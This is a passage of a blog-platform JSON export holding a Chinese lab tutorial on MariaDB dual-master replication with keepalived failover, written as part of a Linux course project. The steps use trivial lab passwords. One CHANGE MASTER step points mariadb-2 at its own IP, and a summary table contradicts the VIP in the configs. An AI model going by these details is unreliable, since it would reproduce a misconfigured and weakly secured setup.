配置成功](./keepalived-linux/7.png)\n\n可以看出mariadb-1主机已经多出来一个172.21.8.50/24的一个IP，这个就是虚拟出来的VIP，当mariadb-1主机宕掉，这个IP就会漂移到mariadb-2主机上，到这里就完成了mariadb双主复制和keepalived的实现。\n","slug":"keepalived-linux","published":1,"updated":"2024-05-03T03:55:54.869Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fy006j7zj3c6795ijx","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>在最后的Linux高级课程的最后，完成了高可用负载均衡WEB服务器的搭建，比较贴合实际的生产环境，一共使用到了7台虚拟机，在我这个阶段，已经是我取得的最高成就了。感觉有必要记录下来，既是帮助后来者，也是方便自己日后进行复习总结。</p>\n<h3 id=\"项目梗概\"><a href=\"#项目梗概\" class=\"headerlink\" title=\"项目梗概\"></a>项目梗概</h3><p>项目一共设计7台虚拟机，其中2台作为调度机，进行对访问请求的分配；2台作为Nginx服务器；2台作为Mariadb数据库服务器；一台作为NFS储存服务器，负责存储Nginx服务器的网页资源。其逻辑拓扑图如下：</p>\n<span id=\"more\"></span>\n\n<p><img src=\"/2023/06/04/keepalived-linux/1.png\" alt=\"拓扑图\"></p>\n<p>我会分几个部分来介绍这个项目的配置，本次先来介绍mariadb实现双主复制和keepalived。</p>\n<p>其中服务器的IP规划如下：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">角色</th>\n<th align=\"center\">网卡名</th>\n<th align=\"center\">模式</th>\n<th align=\"center\">IP</th>\n<th align=\"center\">VIP</th>\n<th align=\"center\">网关</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">mariadb-1</td>\n<td align=\"center\">mst&#x2F;slv</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.33&#x2F;24</td>\n<td align=\"center\">172.21.8.50&#x2F;24</td>\n<td align=\"center\">172.21.8.254&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">mariadb-2</td>\n<td align=\"center\">mst&#x2F;slv</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.34&#x2F;24</td>\n<td align=\"center\">172.21.8.50&#x2F;24</td>\n<td align=\"center\">172.21.8.254&#x2F;24</td>\n</tr>\n</tbody></table>\n<h3 id=\"数据库服务器的配置\"><a href=\"#数据库服务器的配置\" class=\"headerlink\" title=\"数据库服务器的配置\"></a>数据库服务器的配置</h3><p>数据库服务器在本项目中采用双主复制的方式，来进行高可用的实现。</p>\n<h4 id=\"主从复制配置\"><a href=\"#主从复制配置\" class=\"headerlink\" title=\"主从复制配置\"></a>主从复制配置</h4><table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">身份</th>\n<th align=\"center\">网络接口</th>\n<th align=\"center\">连接模式</th>\n<th align=\"center\">IP</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">mariadb-1</td>\n<td align=\"center\">主服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.33&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">mariadb-2</td>\n<td align=\"center\">备份服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.34&#x2F;24</td>\n</tr>\n</tbody></table>\n<ol>\n<li>首先在mariadb-1中进行软件的安装。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y mariadb-server</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>修改配置文件。</li>\n</ol>\n<p>主配置文件<code>/etc/my.cnf</code>无需修改，修改<code>/etc/my.cnf.d/mariadb-server.cnf</code>文件，在[mysqld]段下面添加配置选项，开启二进制日志功能并设置server-id。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">log-bin = master.log</span><br><span class=\"line\">server-id = 11</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>启动mariadb-1的mariadb服务</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start mariadb</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>进入MySQL，作为主服务器创建授权账户slave，并查看主服务器装态。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grant replication slave on *.* to <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;172.21.8.34&#x27;</span> identified by <span class=\"string\">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>授权为对方的IP</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show master status;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/06/04/keepalived-linux/3.png\" alt=\"mariadb-1 master status\"></p>\n<p><code>show master status;</code>之后，表格中的File字段和Position字段要留意，待会要用到。</p>\n<ol start=\"5\">\n<li>在mariadb-2上安装软件，开启二进制日志功能，并启动服务。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">log-bin = slave.log</span><br><span class=\"line\">server-id = 12</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>进入MySQL，开启复制功能。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root</span><br><span class=\"line\">change master to master_host = <span class=\"string\">&#x27;172.21.8.34&#x27;</span>,master_user = <span class=\"string\">&#x27;slave&#x27;</span>,master_password = <span class=\"string\">&#x27;123&#x27;</span>,master_log_file = <span class=\"string\">&#x27;master.000002&#x27;</span>,master_log_pos = 712;</span><br></pre></td></tr></table></figure>\n\n<p>master_log_file字段填写mariadb-1<code>show master status</code>后的File内容，master_log_pos填写mariadb-1<code>show master status</code>后的Position内容。</p>\n<ol start=\"7\">\n<li>在mariadb-2上查看slave状态。</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">start slave;</span><br><span class=\"line\">show slave status \\G;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/06/04/keepalived-linux/4.png\" alt=\"mariadb-2 复制成功\"></p>\n<p>看到图中的两个yes，代表一边的复制功能就配置完成了。</p>\n<ol start=\"8\">\n<li>然后在mariadb-2 服务器上也创建一个授权账户。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grant replication slave on *.* to <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;172.21.8.33&#x27;</span> identified by <span class=\"string\">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>授权为对方的IP</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show master status;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/06/04/keepalived-linux/5.png\" alt=\"mariadb-2 master status\"></p>\n<p>再次回到mariadb-1上，连接mariadb-2，实现复制功能。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">change master to master_host = &#x27;172.21.8.34&#x27;,master_user = &#x27;slave&#x27;,master_password = &#x27;123&#x27;,master_log_file = &#x27;master.000003&#x27;,master_log_pos = 338;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"9\">\n<li>配置完成后，开启slave功能，查看slave状态。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">start slave;</span><br><span class=\"line\">show slave status \\G;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/06/04/keepalived-linux/6.png\" alt=\"mariadb-1 复制成功\"></p>\n<p>到这里数据库的主从复制已经完成了，接下来要配置数据库的keepalived功能。</p>\n<h4 id=\"keepalived配置\"><a href=\"#keepalived配置\" class=\"headerlink\" title=\"keepalived配置\"></a>keepalived配置</h4><ol>\n<li>主机 DB-master 和 DB-slave 上安装 Keepalived</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y keepalived</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>把配置文件保留一个副本</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /etc/keepalived/keepalived.conf&#123;,.bak&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>修改两个主机上的配置文件&#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">route_id</th>\n<th align=\"center\">vrrp_instance</th>\n<th align=\"center\">state</th>\n<th align=\"center\">interface</th>\n<th align=\"center\">virtual_router_id</th>\n<th align=\"center\">priority</th>\n<th align=\"center\">virtual_ipaddress</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">mariadb-1</td>\n<td align=\"center\">db_master</td>\n<td align=\"center\">mariadb-ha</td>\n<td align=\"center\">BACKUP</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">60</td>\n<td align=\"center\">100</td>\n<td align=\"center\">172.21.8.33&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">mariadb-2</td>\n<td align=\"center\">db_slave</td>\n<td align=\"center\">mariadb-ha</td>\n<td align=\"center\">BACKUP</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">60</td>\n<td align=\"center\">90</td>\n<td align=\"center\">172.21.8.34&#x2F;24</td>\n</tr>\n</tbody></table>\n<ul>\n<li>mariadb-1 的<code>/etc/keepalived/keepalived.conf</code> 的内容如下</li>\n</ul>\n<p>全局配置模块</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">! Configuration File <span class=\"keyword\">for</span> keepalived</span><br><span class=\"line\"></span><br><span class=\"line\">global_defs &#123;</span><br><span class=\"line\">   notification_email &#123;</span><br><span class=\"line\">     liuxp731@qq.com\t<span class=\"comment\"># 管理员邮箱</span></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class=\"line\">   smtp_server 127.0.0.1</span><br><span class=\"line\">   smtp_connect_timeout 30</span><br><span class=\"line\">   router_id db_master\t<span class=\"comment\"># 标识</span></span><br><span class=\"line\">   vrrp_skip_check_adv_addr</span><br><span class=\"line\">   vrrp_strict</span><br><span class=\"line\">   vrrp_garp_interval 0</span><br><span class=\"line\">   vrrp_gna_interval 0</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>启用 vrrp_script 模块， 定义对 mariadb 服务的监测</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vrrp_script check_mariadb &#123;</span><br><span class=\"line\">   script <span class=\"string\">&quot;/etc/keepalived/checkmariadb.sh&quot;</span></span><br><span class=\"line\">   interval 2</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>VRRPD 配置段  </p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vrrp_instance mariadb-ha &#123;</span><br><span class=\"line\">    state BACKUP\t<span class=\"comment\"># 备用</span></span><br><span class=\"line\">    interface ens224</span><br><span class=\"line\">    nopreempt\t\t<span class=\"comment\"># 设置不抢占</span></span><br><span class=\"line\">    virtual_router_id 60</span><br><span class=\"line\">    priority 100\t<span class=\"comment\"># 优先级</span></span><br><span class=\"line\">    advert_int 1</span><br><span class=\"line\">    authentication &#123;</span><br><span class=\"line\">        auth_type PASS</span><br><span class=\"line\">        auth_pass 1111</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    track_script &#123;\t<span class=\"comment\"># 配合vrrp_script段使用</span></span><br><span class=\"line\">        check_mariadb</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    virtual_ipaddress &#123;\t<span class=\"comment\"># 虚拟出的VIP</span></span><br><span class=\"line\">        172.21.8.50/24</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>mariadb-2 的<code>/etc/keepalived/keepalived.conf</code> 的内容如下</li>\n</ul>\n<p>全局配置段</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">! Configuration File <span class=\"keyword\">for</span> keepalived</span><br><span class=\"line\"></span><br><span class=\"line\">global_defs &#123;</span><br><span class=\"line\">   notification_email &#123;</span><br><span class=\"line\">     liuxp731@qq.com</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class=\"line\">   smtp_server 127.0.0.1</span><br><span class=\"line\">   smtp_connect_timeout 30</span><br><span class=\"line\">   router_id db_slave</span><br><span class=\"line\">   vrrp_skip_check_adv_addr</span><br><span class=\"line\">   vrrp_strict</span><br><span class=\"line\">   vrrp_garp_interval 0</span><br><span class=\"line\">   vrrp_gna_interval 0</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>启用 vrrp_script 模块， 定义对 mariadb 服务的监测</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vrrp_script check_mariadb &#123;</span><br><span class=\"line\">   script <span class=\"string\">&quot;/etc/keepalived/checkmariadb.sh&quot;</span></span><br><span class=\"line\">   interval 2</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>VRRPD 配置段</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vrrp_instance mariadb-ha &#123;</span><br><span class=\"line\">    state BACKUP</span><br><span class=\"line\">    interface ens224</span><br><span class=\"line\">    virtual_router_id 60</span><br><span class=\"line\">    priority 90</span><br><span class=\"line\">    advert_int 1</span><br><span class=\"line\">    authentication &#123;</span><br><span class=\"line\">        auth_type PASS</span><br><span class=\"line\">        auth_pass 1111</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    track_script &#123;</span><br><span class=\"line\">        check_mariadb</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    virtual_ipaddress &#123;</span><br><span class=\"line\">        172.21.8.50/24</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>在两个主机上编写服务检测脚本<code>/etc/keepalived/checkmariadb.sh</code></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ! lsof -i:3306 &amp;&gt; /dev/null</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    systemctl stop keepalived</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>启动两台服务器的<code>keepalived</code></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start keepalived.service</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/06/04/keepalived-linux/7.png\" alt=\"keepalived 配置成功\"></p>\n<p>可以看出mariadb-1主机已经多出来一个172.21.8.50&#x2F;24的一个IP，这个就是虚拟出来的VIP，当mariadb-1主机宕掉，这个IP就会漂移到mariadb-2主机上，到这里就完成了mariadb双主复制和keepalived的实现。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>在最后的Linux高级课程的最后，完成了高可用负载均衡WEB服务器的搭建，比较贴合实际的生产环境，一共使用到了7台虚拟机，在我这个阶段，已经是我取得的最高成就了。感觉有必要记录下来，既是帮助后来者，也是方便自己日后进行复习总结。</p>\n<h3 id=\"项目梗概\"><a href=\"#项目梗概\" class=\"headerlink\" title=\"项目梗概\"></a>项目梗概</h3><p>项目一共设计7台虚拟机，其中2台作为调度机，进行对访问请求的分配；2台作为Nginx服务器；2台作为Mariadb数据库服务器；一台作为NFS储存服务器，负责存储Nginx服务器的网页资源。其逻辑拓扑图如下：</p>","more":"<p><img src=\"/2023/06/04/keepalived-linux/1.png\" alt=\"拓扑图\"></p>\n<p>我会分几个部分来介绍这个项目的配置，本次先来介绍mariadb实现双主复制和keepalived。</p>\n<p>其中服务器的IP规划如下：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">角色</th>\n<th align=\"center\">网卡名</th>\n<th align=\"center\">模式</th>\n<th align=\"center\">IP</th>\n<th align=\"center\">VIP</th>\n<th align=\"center\">网关</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">mariadb-1</td>\n<td align=\"center\">mst&#x2F;slv</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.33&#x2F;24</td>\n<td align=\"center\">172.21.8.50&#x2F;24</td>\n<td align=\"center\">172.21.8.254&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">mariadb-2</td>\n<td align=\"center\">mst&#x2F;slv</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.34&#x2F;24</td>\n<td align=\"center\">172.21.8.50&#x2F;24</td>\n<td align=\"center\">172.21.8.254&#x2F;24</td>\n</tr>\n</tbody></table>\n<h3 id=\"数据库服务器的配置\"><a href=\"#数据库服务器的配置\" class=\"headerlink\" title=\"数据库服务器的配置\"></a>数据库服务器的配置</h3><p>数据库服务器在本项目中采用双主复制的方式，来进行高可用的实现。</p>\n<h4 id=\"主从复制配置\"><a href=\"#主从复制配置\" class=\"headerlink\" title=\"主从复制配置\"></a>主从复制配置</h4><table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">身份</th>\n<th align=\"center\">网络接口</th>\n<th align=\"center\">连接模式</th>\n<th align=\"center\">IP</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">mariadb-1</td>\n<td align=\"center\">主服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.33&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">mariadb-2</td>\n<td align=\"center\">备份服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.34&#x2F;24</td>\n</tr>\n</tbody></table>\n<ol>\n<li>首先在mariadb-1中进行软件的安装。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y mariadb-server</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>修改配置文件。</li>\n</ol>\n<p>主配置文件<code>/etc/my.cnf</code>无需修改，修改<code>/etc/my.cnf.d/mariadb-server.cnf</code>文件，在[mysqld]段下面添加配置选项，开启二进制日志功能并设置server-id。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">log-bin = master.log</span><br><span class=\"line\">server-id = 11</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>启动mariadb-1的mariadb服务</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start mariadb</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>进入MySQL，作为主服务器创建授权账户slave，并查看主服务器装态。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grant replication slave on *.* to <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;172.21.8.34&#x27;</span> identified by <span class=\"string\">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>授权为对方的IP</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show master status;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/06/04/keepalived-linux/3.png\" alt=\"mariadb-1 master status\"></p>\n<p><code>show master status;</code>之后，表格中的File字段和Position字段要留意，待会要用到。</p>\n<ol start=\"5\">\n<li>在mariadb-2上安装软件，开启二进制日志功能，并启动服务。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">log-bin = slave.log</span><br><span class=\"line\">server-id = 12</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>进入MySQL，开启复制功能。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root</span><br><span class=\"line\">change master to master_host = <span class=\"string\">&#x27;172.21.8.34&#x27;</span>,master_user = <span class=\"string\">&#x27;slave&#x27;</span>,master_password = <span class=\"string\">&#x27;123&#x27;</span>,master_log_file = <span class=\"string\">&#x27;master.000002&#x27;</span>,master_log_pos = 712;</span><br></pre></td></tr></table></figure>\n\n<p>master_log_file字段填写mariadb-1<code>show master status</code>后的File内容，master_log_pos填写mariadb-1<code>show master status</code>后的Position内容。</p>\n<ol start=\"7\">\n<li>在mariadb-2上查看slave状态。</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">start slave;</span><br><span class=\"line\">show slave status 